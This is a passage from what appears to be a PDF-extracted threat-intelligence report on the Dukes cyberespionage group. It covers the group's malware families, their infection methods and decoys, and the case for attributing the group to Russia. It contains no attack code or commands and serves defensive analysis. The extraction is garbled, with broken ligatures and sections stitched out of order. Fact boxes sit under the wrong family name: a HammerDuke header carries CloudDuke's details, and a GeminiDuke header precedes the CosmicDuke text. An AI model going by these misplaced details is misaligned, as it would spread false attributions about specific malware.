the compilation of GeminiDuke from the local time of the computer being used. Comparing the GeminiDuke compilation timestamps, which always reference the time in the UTC+0 timezone, with the local time timestamps used as mutex names, and adjusting for the presumed timezone di˝erence, we note that all of the mutex names reference a time and date that is within seconds of the respective sample™s compilation timestamp. Additionally, the apparent timezone of the timestamps in all of the GeminiDuke samples compiled during the winter is UTC+3, while for samples compiled during the summer, it is UTC+4. The observed timezones correspond to the pre-2011 de˛nition of Moscow Standard Time (MSK) 20 , which was UTC+3 during the winter and UTC+4 during the summer. In 2011 MSK stopped following Daylight Saving Time (DST) and was set to UTC+4 year-round, then reset to UTC +3 year-round in 2014. Some of the observed GeminiDuke samples that used timestamps as mutex names were compiled while MSK still respected DST and for these samples, the timestamps perfectly align with MSK as it was de˛ned at the time. However, GeminiDuke samples compiled after MSK was altered still vary the timezone between UTC+3 in the winter and UTC+4 during the summer. While computers using Microsoft Windows automatically adjust for DST, changes in timezone de˛nitions require that an update to Windows be installed. We therefore believe that the Dukes group simply failed to update the computer they were using to compile GeminiDuke samples, so that the timestamps seen in later samples still appear to follow the old de˛nition of Moscow Standard Time. The GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. GeminiDuke also occasionally embeds additional executables that attempt to achieve persistence on the victim computer. These persistence components appear to be uniquely customized for use with GeminiDuke, but they use many of the same techniques as CosmicDuke persistence components. Map of timezones in Russia; © Eric Muller 23 Pink: MSK (UTC +3) ; Orange: UTC +4 Moscow GEMINIDUKE 18First known activity: January 2010 Most recent known activity: Summer 2015 Other names: Tinybaron, BotgenStudios, NemesisGemina C&C communication methods: HTTP (S), FTP, WebDav Known toolset components: ˆ Information stealer ˆ Multiple loaders ˆ Privilege escalation component ˆ Multiple persistence components The CosmicDuke toolset is designed around a main information stealer component. This information stealer is augmented by a variety of components that the toolset operators may selectively include with the main component to provide additional functionalities, such as multiple methods of establishing persistence, as well as modules that attempt to exploit privilege escalation vulnerabilities in order to execute CosmicDuke with higher privileges. CosmicDuke™s information stealing functionality includes: Keylogging Taking screenshots Stealing clipboard contents Stealing user ˛les with ˛le extensions that match a prede˛ned list Exporting the users cryptographic certi˛cates including private keys Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers CosmicDuke may use HTTP, HTTPS, FTP or WebDav to ex˛ltrate the collected data to a hardcoded C&C server. While we believe CosmicDuke to be an entirely custom- written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal. Speci˛cally, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke. Likewise, many of CosmicDuke™s persistence components use techniques also used by components associated with GeminiDuke and CozyDuke. In all of these cases, the techniques are the same, but the code itself has been altered to work with the toolset in question, leading to small di˝erences in the ˛nal implementation.A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. In the case of CVE-2010-0232, the exploit appears to be based directly on the proof of concept code published by security researcher Tavis Ormandy when he disclosed the vulnerability 4 . We believe that the exploit for CVE- 2010-4398 was also based on a publicly available proof of concept 21.In addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. It should be noted that CosmicDuke does not interoperate with the second, embedded malware in any way other than by writing the malware to disk and executing it. After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers. Sometimes, both malware have used the same C&C server, but in other cases, even the servers have been di˝erent. Finally, it is worth noting that while most of the compilation timestamps for CosmicDuke samples appear to be authentic, we are aware of a few cases of them being forged. One such case was detailed on page 10 as an apparent evasion attempt. Another is a loader variant seen during the spring of 2010 in conjunction with both CosmicDuke and PinchDuke. These loader samples all had compilation timestamps purporting to be from the 24 th or the 25 th of September, 2001. However, many of these loader samples embed CosmicDuke variants that exploit the CVE-2010- 0232 privilege escalation vulnerability thus making it impossible for the compilation timestamps to be authentic.

Additionally, a speci˛c loader is often associated with the MiniDuke toolset and is referred to as the ﬁMiniDuke loaderﬂ. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke. In fact, the oldest samples of the loader that we have found were used with PinchDuke. To avoid confusion however, we have decided to continue referring to the loader as the ﬁMiniDuke loaderﬂ. Two details about MiniDuke components are worth noting. Firstly, some of the MiniDuke components were written in Assembly language. While many malware were written in Assembly during the ‚old days‚ of curiosity-driven virus writing, it has since become a rarity. Secondly, some of the MiniDuke components do not contain a hardcoded C&C server address, but instead obtain the address of a current C&C server via Twitter. The use of Twitter either to initially obtain the address of a C&C server (or as a backup if no hardcoded primary C&C server responds) is a feature also found in OnionDuke, CozyDuke, and HammerDuke.

OnionDuke ˛rst caught our attention because it was being spread via a malicious Tor exit node. The Tor node would intercept any unencrypted executable ˛les being downloaded and modify those executables by adding a malicious wrapper contained an embedded OnionDuke. Once the victim ˛nished downloading the ˛le and executed it, the wrapper would infect the victim™s computer with OnionDuke before executing the original legitimate executable. The same wrapper has also been used to wrap legitimate executable ˛les, which were then made available for users to download from torrent sites. Again, if a victim downloaded a torrent containing a wrapped executable, they would get infected with OnionDuke. Finally, we have also observed victims being infected with OnionDuke after they were already infected with CozyDuke. In these cases, CozyDuke was instructed by its C&C server to download and execute OnionDuke toolset. Further reading 1.

The only known infection vector for SeaDuke is via an existing CozyDuke infection, wherein CozyDuke downloads and executes the SeaDuke toolset. Like HammerDuke, SeaDuke appears to be used by the Dukes group primarily as a secondary backdoor left on CozyDuke victims after that toolset has completed the initial infection and stolen any readily available information from them.

Speci˛cally, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. This, together with HammerDuke™s simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed the initial infection and stole any readily available information from them. HammerDuke is however interesting because it is written in .NET, and even more so because of its occasional use of Twitter as a C&C communication channel. Some HammerDuke variants only contain a hardcoded C&C server address from which they will retrieve commands, but other HammerDuke variants will ˛rst use a custom algorithm to generate a Twitter account name based on the current date. If the account exists, HammerDuke will then search for tweets from that account with links to image ˛les that contain embedded commands for the toolset to execute. HammerDuke™s use of Twitter and crafted image ˛les is reminiscent of other Duke toolsets. Both OnionDuke and MiniDuke also use date-based algorithms to generate Twitter account names and then searched for any tweets from those accounts that linked to image ˛les. In contrast however, for OnionDuke and MiniDuke the linked image ˛les contain embedded malware to be downloaded and executed, rather than instructions. Similarly, GeminiDuke may also download image ˛les, but these would contain embedded additional con˛guration information for the toolset itself. Unlike HammerDuke however, the URLs for the images downloaded by GeminiDuke are hardcoded in its initial con˛guration, rather than retrieved from Twitter. Further reading 1.

HAMMERDUKE 24First known activity: June 2015 Most recent known activity: Summer 2015 Other names: MiniDionis, CloudLook C&C communication methods: HTTP (S), Microsoft OneDrive Known toolset components: ˆ Downloader ˆ Loader ˆ Two backdoor variants CloudDuke is a malware toolset known to consist of, at least, a downloader, a loader and two backdoor variants. The CloudDuke downloader will download and execute additional malware from a precon˛gured location. Interestingly, that location may be either a web address or a Microsoft OneDrive account. Both CloudDuke backdoor variants support simple backdoor functionality, similar to SeaDuke. While one variant will use a precon˛gured C&C server over HTTP or HTTPS, the other variant will use a Microsoft OneDrive account to exchange commands and stolen data with its operators.

These spear-phishing emails range from ones purposely designed to look like spam messages used to spread common crimeware and addressed to large numbers of people, to highly targeted emails addressed to only a few recipients (or even just one person) and with content that is highly relevant for the intended recipient(s). In some cases, the Dukes appear to have used previously compromised victims to send new spear-phishing emails to other targets. The spear-phishing emails used by the Dukes may contain either specially-crafted malicious attachments or links to URLs hosting the malware. When malicious attachments are used, they may either be designed to exploit a vulnerability in a popular software assumed to be installed on the victim™s machine, such as Microsoft Word or Adobe Reader, or the attachment itself may have its icon and ˜lename obfuscated in such a way that the ˜le does not appear to be an executable. The only instances which we are aware of where the Dukes did not use spear-phishing as the initial infection vector is with certain OnionDuke variants. These were instead spread using either a malicious Tor node that would trojanize legitimate applications on-the-˝y with the OnionDuke toolset, or via torrent ˜les containing previously trojanized versions of legitimate applications. Finally, it is worth noting that the Dukes are known to sometimes re-infect a victim of one of their malware tools with another one of their tools. Examples include CozyDuke infecting its victims with SeaDuke , HammerDuke ,or OnionDuke; and CosmicDuke infecting its victims with PinchDuke ,GeminiDuke or MiniDuke .DECOYS The Dukes commonly employ decoys with their infection vectors. These decoys may be image ˜les, document ˜les, Adobe Flash videos or similar that are presented to the victim during the infection process in an attempt to distract them from the malicious activity. The contents of these decoys range from non-targeted material such as videos of television commercials showing monkeys at an o˛ce, to highly targeted documents with content directly relevant to the intended recipient such as reports, invitations, or lists of participants to an event. Usually, the contents of the decoys appear to be taken from public sources, either by copying publicly accessible material such as a news report or by simply repurposing a legitimate ˜le that has been openly distributed. In some cases however, highly targeted decoys have been observed using content that does not appear to be publicly available, suggesting that these contents may have been stolen from other victims that had been infected by Duke toolsets. EXPLOITATION OF VULNERABILITIES The Dukes have employed exploits both in their infection vectors as well as in their malware. We are however only aware of one instance - the exploitation of CVE-2013-0640 to deploy MiniDuke - where we believe the exploited vulnerability was a zero-day at the time that the group acquired the exploit. In all known cases where exploits were employed, we believe the Dukes did not themselves discover the vulnerabilities or design the original exploits; for the exploited zero-day, we believe the Dukes purchased the exploit. In all other cases, we believe the group simply repurposed publicly available exploits or proofs of concept. 26ATTRIBUTION AND STATE˜SPONSORSHIP The Dukes appear to prioritize the continuation of their operations over stealth. Their 2015 CozyDuke and CloudDuke campaigns take this to the extreme by apparently opting for speed and quantity over stealth and quality. In the most extreme case, the Dukes continued with their July 2015 CloudDuke campaign even after their activity had been outed by multiple security vendors. We therefore believe the Dukes™ primary mission to be so valuable to their benefactors that its continuation outweighs everything else. This apparent disregard for publicity suggests, in our opinion, that the benefactors of the Dukes is so powerful and so tightly connected to the group that the Dukes are able to operate with no apparent fear of repercussions on getting caught. We believe the only benefactor with the power to o˚er such comprehensive protection would be the government of the nation from which the group operates. We therefore believe the Dukes to work either within or directly for a government, thus ruling out the possibility of a criminal gang or another third party. This leaves us with the ˜nal question: which country? We are unable to conclusively prove responsibility of any speci˜c country for the Dukes. All of the available evidence however does in our opinion suggest that the group operates on behalf of the Russian Federation. Further, we are currently unaware of any evidence disproving this theory. Kaspersky Labs has previously noted the presence of Russian-language artefacts in some of the Duke malware samples 9. We have also found a Russian-language error message in many PinchDuke samples: ﬁ ﬂ This roughly translates as, ﬁThere is an error in the module™s name! The length of the data section name must be 4 bytes!ﬂ Additionally, Kaspersky noted that based on the compilation timestamps, the authors of the Duke malware appear to primarily work from Monday to Friday between the times of 6am and 4pm UTC+0 11. This corresponds to working hours between 9am and 7pm in the UTC+3 time zone, also known as Moscow Standard Time, which covers, among others, much of western Russia, including Moscow and St. Petersburg. Attribution is always a di˛cult question, but attempting to answer it is important in understanding these types of threats and how to defend against them. This paper has already stated that we believe the Dukes to be a Russian state-sponsored cyberespionage operation. To reach this conclusion, we began by analyzing the apparent objectives and motivations of the group. Based on what we currently know about the targets chosen by the Dukes over the past 7 years, they appear to have consistently targeted entities that deal with foreign policy and security policy matters. These targets have included organizations such as ministries of foreign a˚airs, embassies, senates, parliaments, ministries of defense, defense contractors, and think tanks. In one of their more intriguing cases, the Dukes have appeared to also target entities involved in the tra˛cking of illegal drugs. Even such targets however appear to be consistent with the overarching theme, given the drug trade™s relevance to security policy. Based on this, we are con˜dent in our conclusion that the Dukes™ primary mission is the collection of intelligence to support foreign and security policy decision-making. This naturally leads to the question of state-sponsorship. Based on our establishment of the group™s primary mission, we believe the main benefactor (or benefactors) of their work is a government. But are the Dukes a team or a department inside a government agency? An external contractor? A criminal gang selling to the highest bidder? A group of tech-savvy patriots? We don™t know. Based on the length of the Dukes™ activity, our estimate of the amount of resources invested in the operation and the fact that their activity only appears to be increasing, we believe the group to have signi˜cant and most critically, stable ˜nancial backing. The Dukes have consistently operated large-scale campaigns against high-pro˜le targets while concurrently engaging in smaller, more targeted campaigns with apparent coordination and no evidence of unintentional overlap or operational clashes. We therefore believe the Dukes to be a single, large, well-coordinated organization with clear separation of responsibilities and targets. Map of timezones in Russia; © Eric Muller 23 Pink: MSK (UTC +3) ; Orange: UTC +4 27The Kaspersky Labs analysis of the Duke malware authors™ working times is supported by our own analysis, as well as that performed by FireEye 22 . This assertion of time zone is also supported by timestamps found in many GeminiDuke samples, which similarly suggest the group work in the Moscow Standard Time timezone, as further detailed in the section on the technical analysis of GeminiDuke (page 17). Finally, the known targets of the Dukes - Eastern European foreign ministries, western think tanks and governmental organizations, even Russian-speaking drug dealers - conform to publicly-known Russian foreign policy and security policy interests. Even though the Dukes appear to have targeted governments all over the world, we are unaware of them ever targeting the Russian government. While absence of evidence is not evidence of absence, it is an interesting detail to note. Based on the presented evidence and analysis, we believe, with a high level of con˜dence, that the Duke toolsets are the product of a single, large, well-resourced organization (which we identify as the Dukes) that provides the Russian government with intelligence on foreign and security policy matters in exchange for support and protection. 28BIBLIOGRAPHY 1.
